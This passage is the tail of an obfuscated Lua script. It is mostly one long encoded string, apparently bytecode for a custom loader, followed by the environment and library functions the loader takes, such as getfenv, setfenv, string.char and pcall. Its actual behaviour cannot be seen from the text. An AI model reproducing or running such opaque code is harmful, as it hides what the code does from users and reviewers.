R13MF33O6D3OR43LL13ODT3P1H3OGX3MF73O6N3ORB3O6P2123NVD3O6T3ORH3M1K3O6X3MKK3ORM3NJY3OHC3ORP3LM03L3L3O763ORY3O783OHM3A8I3NK43N7Q3O7C3ORZ3M2C3OHU3OS23O7I1W3OI53M2K3LMS3NWB3MUX3O7Q3OI83OSQ3OSE3M2X3NKY1Z3OSQ3O803M353NWS3OIK3NWU3O873NL83OSW3O8B3LNW24D3CSD3O893OT33M3P3OT53N9G3LO83O1Q3OT93OJ43OTC3NXJ3O8R34Z13O8U3OJG3O8W3M4B3NM13NA13OJH3OTQ3O953A8I3NM93NM322K3OJS3O9A3M4T3O9C3MJ03O9E3NYG3OJV3M533OJX3NYE3OJZ22N3M513NYK3OK33O9Q3A8I3O9S3P4B3NAZ3OKA3MJU3OKC335A3OKE3OK922M3OA23NYY3OUS3OKK3M613NW73OUY3GIB3OV03OAB3LR424D35123OKU3MYR3OKW3OV93LRG3OD03OVC3NZP3NBC3OVF3NZS3OAR34KK3MZ13NZY3OLB3OVM335A3OVO3NC93MZJ3OLH3M7B3OB43OLK3OB622J3OB93OM13OW23NCT3LSS3P1L3LSV3O0L3OW93OBJ3N083O0Q22I3OM43O0U3M853O0W3OM83OBS3A6F3OWN3NPF3OWQ3O153A8I3O173NPE22C3OC03O1K3OWX3M8R3OMP3MKK3OC7332W3NPY33BZ3NQ03A8I3NQ23O1K22F3OXE3O1S3M993O1U3OXC3OCK3P6D36CG3LUW3OCO3M9L3OCR3P6L3O273NEM3OCW3O2A3A8I3O2C3OCU3MQM3ONH3NQW36CG3OY03O2K3ONM22E3NR43ONP3MAD3ONR3A8I3O2U3NR43P773OYC3MPW3ODH3MAP3NRH3P7D3OO33OYZ3OO53O393A8I3OYO3NRK3MMA3OYS3LX53OOC3ODX3OYX3O3I2293OE13MPQ3OOJ3OZ53O3Q3OZ734ZS3OZ9346N318Z3P773O3X3HZJ3OOU3MBW3O423P863OOZ3MC23OEN3NSP3A8I3NSR3MBS3OD03OP83OZR3OEW3NSZ3OEY34GJ3NT43N4Z3MCN3N513A8I3NH53OZQ24D3P773OPM3NHJ3OFA3LZW3OPS3O4S3P923N5G3NHQ3O513LJQ3P0E3P033MT23P0I3CYL3OFP3P0L3OFR3O5B33523MRT3OQ93MDR3OFZ3NI33OG13P773P0W3FN33OG53P0Z3LK424D3P9W3P123NUI3OQP3LKD3NUM3N0M3OQU3M0W3P1B3LKN3OGM344L3OQV3NIZ3M0Z3NJ13NV33P1K3MKK3OR739LI3OGY3M1A3O6P3CUA3OH33P1U3M1I3OH63N7L3LLO3NZM3P1Z3MFZ3ORO3N7T3P23332W3NVU3O773M223O793MUC3NVZ3MMA3OHR3NKA33BZ3NKC3P2G3NW62273P2J3NW93P2L3O7O3OI33NWD3EXL3OSC3N8O33BZ3NWJ3OSG3NKY340I3O7Z3OSL3O813M373NL53MT23OSU3LNZ3O8A3N973P353D6N3P383NLU3OT43NXA3O8I3NXC3NLN3NXF3P3G3M413O8R3DSC3N9L3MWH3OTI3P3O3OJE3MKK3OTO3NM533BZ3NM73P3U3NY035ML3OTV3NMM3OTX3O9D3LPJ3NZM3OU336AK3OJW3OU73P483O9K34OD3O9N3NYQ3O9P3M5F3NN13MMA3OUJ332W3NB233BZ3NN63OKD3OA03CWN3MJS3NND3P4S3NNG3OKL3MYE3OA93P4Y3NNO3P5034O63P533OL23P553OAI3P573MT23P593OL43P5C335A3NZT3MYR34YE3OL93NCG3OAV3NOD3LS43P5Z3NOC3OB23OLI3M7D3O0A33D93MLQ3OW13NOR3OW3335A3OW53MLQ3MKK3OW83OBI3O0O3OLZ3O0Q21T3P673NPE3OM63M873OBS3MQM3OWO3OME33BZ3OMG3P6I3OBY21S3P6M3N173P6O3MMZ3OMP3MMA3P6S3E1J3OX43MN93OCC35N23OCF3NE53OXA3ON13NQB3EXL3OXH3P7A3MNT3OCR21U3OCU3P7F3M9T3OCX3OXU3OCZ3MT23P7M3OD33P7P335A3O2L3NQU365M3OD93MOT3ONQ3O2S3P7X3ODD3N0M3P813ONX33BZ3ONZ3OYG3NRH23G3NRK3OO43MAX3OO63O3A3ODS3LQU3OYL3OOB3MB73OOD3NFV3LX224D23J3P8M3N3S3P8O3MBJ3P8R33BR3P8T3330318Z3MKK3P8X3NGD3AFN3OOV335A3OEI3OOS23I3P993NSN3P953OZN3OP43PHN3MQN3P9N3O4E3OPB3P9E3OPD3PHV3MCB3NT53NH23P9K335A3P9M3PIR3MQM3P9Q3LZ53P9S3MDT3P9U3NH131DW3O4Z3OFH3MD73OFJ3P0D3OFL3PIJ3PA43NHS33BZ3NTU3PA83NHW3PIQ3NU03MS33OQA3LJQ3NU53BJK33CT3MMA3PAI3O5N37F33O5P3OQJ3NIE23C3OGA3PAQ3P143OQQ3O603NUM3PIJ3PAV34QK3PAX3MEN3OGM3PJJ3PB13N703OR33N733P1K3N763NV73PBA3MF93O6P2N43PBE3OHA3P1V3O6W3PBJ3PIJ3PBL3D0F3P213PBO3M1W3PHU3P253NW13P273ORV3M263O1Q3PBY3O7F3M2E3O7I23E3PC53NWG3PC73OS93LMX3ESZ3OHZ3NWH3P2R3NKX3LN83PKY3PCJ3NL73PCL3MHC3NL53N0M3PCP3GGA3P333PCS3M3J3PLF3PCQ3P393MHU3P3B3NXB3P3D34G03N9C3PD23O8O3P3H335A3NXK3NXE3CLY3PD73NXO3MWJ3OJC3O8Y3NM131623OJG3O933P3S3OJJ3M4N3L953P3Y3OTW3P403OTY365H3OU03OJM35PM3NYA3P4B3PDS3M553OJZ378S3OK13PDY3P4D3PE03OK63PMC332W3PE33E343OUL3M5P3OA02343P4Q3OUR3OA43OUT335A3OUV3PEB3LVH332W3P4W3MYH37F33NBK3NZA3NNP2373NZL3OAF3M6H3OAH3NBV3OAJ2363NZU3NO13OVE3M6T3OAR353Q3PEZ3NOG3PF13O013PF32303NCG3PF63P5P3OLJ3OVW3O0A313Q3PFB3P5V3PFD3P5X3M7P24D2323OM13LSX3P623PFL3OWB3O0Q22X3PFP3NP83PFR3MMF3OBS3AFY3MMK3N0O3P6G3OBX3NPJ316V3O1B3OWW3M8P3OMN3O1G3OMP35XW3N173OX33M8Z3OCA3P6X3OCC353T3PGE3OMZ3P733OXB335A3OXD3N1H33BZ3PGF3P793ON63OCP3OXL3OCR3DD13NEL3O2M3P7G3ONE3OCZ351Y3NQU3OXY3MA33ONK3P7Q3OD622P3P7T3ODA3PH53ODC3NR922O3ODA3NFB3P833MOY3NRH22R3PHH3P883PHJ3P8A335A3P8C3NRD22Q3OYZ3PHP3MPI3PHR3ODY3PHT332Y3NFZ3P8N3OE33P8P27A3O3R387Y3PI23MQ038K13MQ33OZD3P8Z3MQ83O423LAD3P933OZL3PIG3MC53O4A2F03OES3O4D3OPA3NSY335A3NT03MC23PN93LYL3OF23P9J3O4N3P9L3OF53PMX3NTC3P033PJ13O4W3LZ233102BL3NTJ3P9Y3OPW3PA03OFL2483PSH3LJ93NTS3PA63LZL3O5B3PP03PAB3NU13PAD3P0S3PAF3MS824B3PSO3M013N693PAK3MSE3PAM3PS33OQN3O5X33BZ3O5Z335A3O613NIA24A3PT23PK63NUR33BZ3NUT335A3NUV3OGH3PNO3N6Z3NV63PKE3NJ23P1K3PTP3PB83NJ733BZ3NJ93P1Q3NVB3D3S3PKN3MFG3O6U3ORI3NVH3O6X2443PT23PKT3NVN37F33NVP3NJT3NVR3PSU3ORN3PBS3MG33PBU3N813ORW3K5X3MUH3LMF3PL63MGG3O7I3PSN3O7L3P2K3MGP3P2M3N8I3PLE3PUU3N8E3PLH3M2V3O7V3N8R3PLK3PUH3OSK3PLN3P2X3OSN335A3OSP3MVC3PU93NL73N943M3F3NLA3OIS3P352463PT23OIV3NX83O8H335A3O8J3O892413PT23P3F3PM73PD43LI62WE3M153OTG3MWQ3PD93NM03OJE3M153PDD3OJI3OTS3OJK3PVG3OJM3P3Z3MIY3P413MX73NY83PQ5332W3PDQ3OU53NYD335A3NYF3NMM2403PT23OUB3NN33PDZ3NN03OK63M5J3P4J3MXZ3P4L365H3P4N3OUC3OLC3OKH346N3MK337MV3MY93LQQ3NNH3PWD3OKN3NZF3PEI3OKR3P503PWK3MKL3OKV3PNZ3OKX365H3OKZ3NBI36IL3NO03NZX3PO63OAQ3LRS3OL53NC13P5H3ML83OLC3NCD3PF33LYK3OVR3FRX3PF73MLL3O0A3PXE3OVS3NOQ3MLT3OBC3O0H3P5Y3PQU3O0K3POV3PFK3M7X3O0Q33A53OBN3P683N0G3P6A335A3OM93OBN3LYK3PFV3OBW3MMP3OBY3LYK3OMK3O1D3LT73OWY3PPH3OC53PYB3GIZ3PPL3MN73PPN335A3P6Y3N173PO93NPX3N1I3ON03MNJ3OCK23X3PT23PGK3PQ13P7B3O253LX43OXP3MS93PQ83MO43NQS3LX43PGW3OXZ3MA53ONM3PZ83OY43NRB3ODB3MOP3ODD3POM3NF33PQQ3MAN3O313NR4355K3LGY24C3PR036N434QA3EWB3GKJ3LH63IBR3LH933WR3PR63P8J3PHT3LW53OZ13NG93PRC3PHZ3MBL3HRN3PRH3B3V3PZ83PI63OZE3PI9365H3PIB3MQ33PQI3O453P943OP13P963OOS23Z2F33MPV34VK33B233RG3KV2330H33V9318Z34QE33ZI2HD23T330K33QK3L0G3KGR3KGI33QJ36S532JJ3PS13OZL3LHI3PS43O4S3OZY36U42HD2453PXS2M23A543PXS377B38QA3IYT2HD3LF034M82HD2433PXS34T43Q2M33VN3L0I3D5O33NF3L0I3Q2E3FDX3PXS3A622HD331J29Z3ER139I639JR3D5P3IBY38VR3LDO33PV26K3A8R37RR3Q293KZK3Q2K32D63Q2N395J3PXS343V3Q3D3LCH33PL2HD22K3Q2V333H3Q3P3IQV31A326H3Q3Q363Y3Q3J34353Q3L3LCJ23Z35XH2M2331S3PIW36N42IC3CZE34YZ3Q0N3LYX2BO3MCX3ASK3CPG3O4G3LYI35TC3OF13Q263PS636SU3Q3B24M3Q2B343P3Q4P3Q2Q3AS92HD24N3Q3W27B3Q4W3Q4T33193LGZ3Q2231S62TT3LH43Q2536N43NT637K23PS734ST2M236223CPB3NSW3LDB33Y52M23LGR33Y83CPG3IK33PXS3KU13PXS3MQ323U2F333A52M239G43OES3Q5S39OY2HD26N3Q3Y36GT3LAP27A3M1Z31HF3Q5K3PJO33QM3MEC31S63OQF3GEY3Q0P38UG3HHG3AYH365Q3NHV3LZN3Q4J3P0J3PSW3N623PAE34LJ2RC25C3PXS32KP333H3Q6T36BR2RC3Q643DP432KP334924924C3Q6933ZI3Q6B3G833Q4B3PJT3CYJ3Q6H3B0N3Q6J3P0M3Q6L3LKR3P0P3OFW3P0R3Q4N3NHH3Q6U343P3Q6133VN2RC37ML2RC26U3Q4X27A3Q7V3Q7R33M93LGZ3OQ636N43LJJ3Q6A3LX63G833Q6F3NI234ST3P093Q5F3CYL3Q5H3APT32KP364B34PA365Q33R63Q6X343P3Q7Y3Q7P3Q5O3518351F2F1243351D3Q8Q34XQ24D26K3Q8T34TH34XU3Q1Q36CD3PXS34XZ2HD24I3Q5O335H3Q3S3OOS3Q5Y3IPG3Q5V3Q4I3Q9C340Z2HD22L3Q623Q6Z3L2Z33M632KP331933MB3Q7S37103LZ523P2F33PJY3LIV3L8W3K053LHF3CYJ3LLE35SK3Q4B3OFX3K053PSY3Q6R35N43Q7O364V3Q5Q33M63Q9R351W2RC1F3Q7W36FM3QAC36GT3Q5124C3Q8231S63Q843Q773Q86381D3Q883Q6Q33P13Q8B3O5D3Q8E3CU03Q8G34AH3Q8J356A1P3Q9827B3QAH3Q6Y33Q136CM32KP3Q6733VV3QAE3AR13Q9T3Q9V36GT3EJZ2BO3QAO3QA13Q853QA43LZT3QA63Q7M3OCS3QAA335H21I3Q9K3QBA3CR43LG93QBE3EO03QBH27B3Q9W3GXZ3QBL3MDA3QBN3QAR3QBP3QAU3QA733WD2RC3Q9J3KHZ333H3QCG341V3QBF33PL2RC2103QAI3QCO3Q7Z3QAM3QBM38UG3Q563OFV3Q6C3QBQ3KY13QA73QAW3LW73Q8C33CT3QAZ33OC3QB133XH3QB3359O3QBW34T43QCQ34Z33Q8P34Q6351934Q01W3Q8Z34Q43Q8V351A3P363QDK3Q912BL26D3Q94351N2HD3QDS35212HD3KXI35AG3Q1V3GXI352S2HD21U3QAI3QE53QDX34X03Q5T24C3Q9E3MCH3QE93Q5Z31DX3QAK2RC3KIY29332KP330Y3LEP3D6A36D939NB2BA3Q5K352O3QAL3GE33QCM24D21S3QAI3QEY33VN350Q3QAM3OQK33ZI32FK3Q563N6I3HO23Q6F3PTC33P133CT35T93Q8C32BJ3QD53CYL3Q7D3OFM3Q0P33R62243QB627A21T3Q2E32J23QES37SS2HD22C3Q5Q332W38QA3A623LFL36FX2BA3Q1M33OH3Q1Y3Q2Y39N13GJN3DUS27D340I3KR227C340I36YN3QGE3JGC32ZD31622RC339P3PHV3DOQ3Q383LJA330K3NHB3Q563LJ03QGR3LZI3QGT3CQI3QGV3CQB3QGX35463L4Y3QGW33QM3LK03QGZ3GDT3QAP2RN3QH73HGO3IBB3DZN35SK23M330K350Q35T93QCV3QGA3G833QGD3HHF3QCY35T83NIC3DYK33CT360E32JJ32FK3QGG365H3Q7B343E33CT353E3QHS3QGA3QHV3QGI3P1D3Q6F334M3QI13A8M29333CT33413EXP3QEO33PX3E393AH83HRX3E393QHN2BA3EK036D93H9S3IH539WQ3Q1Y365H32FK3Q8H35C337US3AC33QG4346N3QFZ3PDW35A33PYO31A337ZO3PYO33PI3KL6350331A32593PYO3IIO3QJ833M63QJA3OZA335K2F333BD3KL23CWW33O5318Z34FQ3Q8C3Q5D2F333OC318Z3QHN33OG3KGE37D13PYO3ILZ3QJ83Q3A3AKV3AFN33353OED359W27B3P5T3L093HSA3OED3KV83QE03DUS361K3NGE3QE23AY9318Z3QK73OEL3QK927A3P5T3QJQ3HSF3MQD3CPK35AG2M2322I3FLK3QJW3H1G2HD2543PSH3LCY2M23KWK27D3L0I3QKT3KGR3QKN31S62IC3QKP37K2362234YU3N4Q2563QJL36SY322I34ZG33BZ3Q5J3Q9S371S2513QLL2TT362236FU331L2IC3QES3A622RC3A5Q3QIH3DQB34RY3A6232KP39AX3QG93QM635WU3BAJ3QG93L2O3A623M0734G62BA36Q736XN3IVL32FK3QEJ3FN337CB3QME3KTE381D32ZE353E33PL32FK2703QJE343P3QMY3IT833HP353E3QLI332W356H2503QLL356H322I3LLQ39LI338E35AG32YI322I35873PTY3P1P341V334L3QMO3QNA3QG23KQ939I63I0J3QET334L32ZE357U33PL334L25G3QMZ333H3QNZ339Z2IC3KMU359O25E3QJG39LI39OU33472523QLL3347322I3D0B32JJ332R3QO5334M32YI3CRH3F4G32J23QNS359O26Y3QO833HP39OU334L3KV435AG334L3FL13PU73QFJ29I33HP357U3F4G340I3HU23K5M34QK24Z3D5O293356H38I732Z53Q383IBY3QFT31CX3LKQ357T330H3Q3A33HP24W3QPB3ESK333B3QEN3QI63QML3DQB3QHX340I3G5U3E2S356H37D23QPT3QFT3QPG3QNR33A83Q3A356H24Y3QPQ356H3KF23QQ33E393L2O3GEA32HS340I3KN03DZ1334733593QQE3DQB3QQG2BA3QOJ316X24C33473QQA3FFZ334734ZG340I3CRH27A3LRU3NVX24T3QLL358D322I3D0I3A623LMY3QNP3H5F3QQF32Z831CX332R3D0I3PIJ358D24S3QR63DUS3QR92933MGM3QMI3KN339I63QQG3QRG3PBU3QRJ3E063QRM3QR83DZ13M2B3QRR3QRD3QQP3QRF3D0F3QRI3ORY24U3QRZ3KNB3D1J33NF34B033322BA3D0B39WQ3QRU3QS737303NW124P3QSB27A3QRO35H1335V3QPF3QRS3QSJ3QS63QRH3QSM3MUH334D35AG3QR73QSC3QRA3FN33QS33OH63QRT3QSX3QRW3ORY24R3QSP3PBU3QT53HNS33OH3QSI36AA3QTA3QS83NW124Q3QTE3QSR33NF35PH3QSU3QS43IBY3QSK3QSY36IT3NW124L3QTP3QS13EL03QT73QTJ3QPV2BO3QRV3QTM3MUH24K3QU13E2S33NF335J3QTT3QT83QSW35UB3QSL3QTY3MUH3KTY3QT23QRN3QU23LF53QUG3QU53QM43QU73QUK3PLX3NVX24M3QUC3QSD3D0F3QU43QRE3QUJ3QTX3QUX358D3KVH3QUO3QS03QUD3NVX3QV33QS53QV53QTB3NW124G3QV03QT536KZ36D93QUT3QQ527C3QU83QSZ3OHK35WC3QVA3QT43QRP3MGW3QVE3QTV3QTL3QVS3ORT24I3QVK3QVX342Z3QUS3QV43QUV3QV63QRX2653QW535H133AF3QVZ3QT93QVG3QU93OHK2643QWE33NF35RC3QW83QVF3QWA3QVH3MUH2673QWN3OIW35PE3QSH3QW93E3K3QW13QUL3OHK35913QVV3QSQ3QU235Z13QPT3QVO3LCN36D934OP3QVR3QX33ORT359Q3QX63QTF3QVX36KW3QXA3QX03D6G3QX23QV73FW53QWW3LFZ3QXN3QWR3QX13QWJ3QW23NVX2633QWW32ZK3QWY3QSV3QTK3DQB3QXE3QUW3QRX2623QWW343R3QXV3QW03QY73QXQ3QRX25X3QWW3HFV3QWQ3QYF3QWS3QWK3ORT3KX13QXJ3QTQ3IAU3QSG3QY53QU627D3QXF3QXR25Z3QWW35YN3QYM3QWI3QYO3QXZ358D25Y3QWW3D303QWH3QUI3QZ63QXG3NVX25T3QWW35XY3QZ43QZD3QYY3QY93ORY25S3QWW3D3B3QZC3QY63QZE3QXR25V3QWW3A2J3QZK3QZT3QZM3QWB3ORY25U3QWW3K443QZZ3QYX3QVQ3QZN3NW1356P3QYS3QU23D3L3QZS3R0827B3QYZ3QRX25O3QWW373U3R073QUU3R013QWT3OHK25R3QWW34PQ3QYV3QTU3QZ53R0Q3QYP3NVX33AI3R0D3QVC3HGE3R0O3QVP3R0I3R0A3MUH25L3QWW3D4A3R0G3R0P3R093R023NW125K3QWW33PQ3R0W3QUH3R003R1G3R0R3ORT25N3QWW36VM3QTI3QXO3R183R1H3MUH3KXC3R133QV13KFN3R163QXC339Q3R193OHK25H3QWW36LE3R243L8R3R1P3R10358D3LXD3R213QT53HDG3R2C3QHL3R1X3R1Q3NVX25J3QWW33WF3R2L3QTW3R2O358D34963R2I3QVX360Q3R2T3QYH3ORY25D3QWW34O83R313QXY3QZF358D25C3QWW3HNV3R373QZU3QRX25F3QWW34MU3R3E3R0Z3QZ732H23QWW36C43R3K3R2E3R3M3HFB3R2Y35H131ID3R1E3R1727A3R0J3ORY2703QWW345Z3R3Q3R2N3R2F36VX3QWW36093R1M3QXB3R2D3R463R3M2723QWW31UH3R3X3R253R403NW13E7933BD3QT33QX73QVC35ZM3R453R3Z3R273ORT26W3QWW374V3R1V3QXW3R3R3R3929D3QWW32Z73R4J3R4D3R4U3R1Y3OHK3K32356O3NVX3QVB3QV136B43R4T3R263R5A3ORT26T3QWW2J83R573R2M3R593R2V2BB3QWW3L2S3R5P3R2U3R473LGZ3R3U33NF374I3R5I3R4L3MUH35F13R6035IC3QRC3R1N3R0H3R5R3R4726P3QWW36N63R633R4V3NVX33WQ3R5D3R4P3QXK35H132HL3R5W3R323NW13KQZ3R6736WV3R503QYN3R3L3R533KZN3R673KMJ3R4B3R1W3R6C3R3M26L3QWW34073R6Q3R383QXR3Q3A3R6735FQ3R7A3R3F3ORY3AEY3R673AMF3R6H3R5K3NVX3BX63R6L3QUP3QVC3HDL3R7M3R5S3FYS3R4O3R7R3QV13L6P3R7G3R6Y3QXR36DP34YM3R6M3QYT3L6W3R813R523QXR26J3QWW333V3R893R4E3R533KSY3R6736D63R7U3R4726D3QWW3L7V3R8F3R753R5326C3QWW36OE3QVN3R743R5J3R5S3KZ13R67361Z3R8L3R3M33N03R6732VF3R8Q3R8Y3R473KYJ3R673K3A3R8W3R513R8G3QXR2683QWW3L9E3R983R643OHK26B3QWW36O63R933R5333AC3R6734T63R733R9F3R8R3QXR34KX3R67375R3R9W3R6X3R8A3QRX1S3QWW3LAT3R9L3R6I358D1V3QWW388F3RAA3R7N358D1U3QWW32Z33RAG3R5S1P3QWW34KZ3RAM3R471O3QWW39EI3RAR3R3M1R3QWW36Y53R9E3RA43R9G3QRX1Q3QWW34QN3RA33R0Y3RA53ORY1L3QWW3LCY3RAW3R533L343R67338A3RBF3QXR1N3QWW330B3RBK3QRX1M3QWW363Z3R9R3QXR1H3QWW3NIX3RBP3ORY1G3QWW376Z3RBU3QRX1J3QWW34Y13RB83QZL3RBA3NW11I3QWW36F03RC43ORY1D3QWW3ENP28X3QWZ3R9X3A063IBY3QY83RAH3NZV3QWW36X63RCL3QYW3R1F363A38L03GK93R7B3QRX1F3QWW36PA3RCV3R0X3RCA3RCY3EY13R6R3MUH1E3QWW3NNB35QW3RCM3RB236D93RCZ3H9V3RB33ORY193QWW36303RD63R6A3RCX3RDJ3RDA3RD13ORY183QWW3NOO3RDG3RCW3R3Y3RCO3QXX3R7H3NW11B3QWW26A3J2I3RDH39I63RDK375E363A3QIM3R4K3RAB24D1A3QWW3DZB3Q313RE23KP03H3U39I63REH3R583R993R3M153QWW3NR33A2D3REC39WQ3REE362P2BA3RET3R5Q3REV3R533L243R6736PW3REO3RD73RD93QYG3DQB3RF63R5X3R3M3L1R3R673NRJ3RF03REP3KOI3RD03IBY3RFI3RDB3OHK163QWW39QI3RFD3RDS39X73RFG3RFS3R8X3R9M3ORT3L193R673ETP3RCG3NW1103QWW3K543RBZ3NW1133QWW36Z83RGA3MUH123QWW32W23RGF3MUH21P3QWW3KLI3RC93R1O3RDM3NW121O3QWW37EV3RGK3OHK21R3QWW3HEI3RGP3OHK21Q3QWW365D3RH13ORT21L3QWW3L523RGU3R6B3RF83QXR21K3QWW3D4V3RH63ORT21N3QWW3NYP3RHN3NVX21M3QWW36G03RHB3NVX21H3QWW3NZW3QY43RFE36D93DUY3RHH3RG53NVX3L593R6736YH3QYE39I63RI53RDT3RHI3QRX21J3QWW35RP3RIC39WQ3RIE3RE33RI7358D21I3QWW3KKA3RIL363A3RIN3REI3RCR21D3QWW364G3RIU3RI43RG43REJ21C3QWW3KM53RJ233OH3RIW3REU3RIP24D21F3QWW367S3RI23RG03QKD3RDI3RIG3ORY21E3QWW356V3RJI3R4C3QE23RB93RGW3MUH2193QWW35VH3RJR3E393RJB3RF73RJD2183QWW33CO3RK03DQB3RK23RFJ3R5321B3QWW3O633RK83IBY3RKA3RFU3ORT21A3QWW34M83RKG3RID3RJ43RCR2153QWW3O753RKO3RIM3RKQ3R5S2143QWW33633RKV3RIV3RKX3R472173QWW34WR3RJ9361J3RL43R3M2163QWW3O8D3RL23RJ33RCN3RJD2113QWW35VR3RLG3RJA3RLB3R533L4C3R6735MW3RLN3RLA3RLI3REJ3L403R6734XM3RHS358D2123QWW330F3RM13L3L3QWW33VB3RM61W3QWW34W03RHX358D1Z3QWW3OB83RM61Y3QWW34TW3RGP3DP4358D21G3QPM24C358D22L3PSH33M6358D3QLC3OS73QLF3P5T358D3D0I3LR63MGW22K3QLL34GY322I3CS73PCE3PUY3QGH3KNH2BO3PC43KNL32HS3D0U32Z83FHJ2BO3DK727D3KO334L13GGJ22N330K34B432JS3D1I3A6236K53CR73A263RE439WQ3FS82BA3RNE363A3QIT3RE32BA3RNH36D93RNJ363A3RNL387Z3775348Y340I3KO93NMA24D22M3QPQ33M03OCT3BYY3RO83FMF3RO23E393ROJ36D93QR139WQ3QPI3NVX3D1Z35P736GS',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
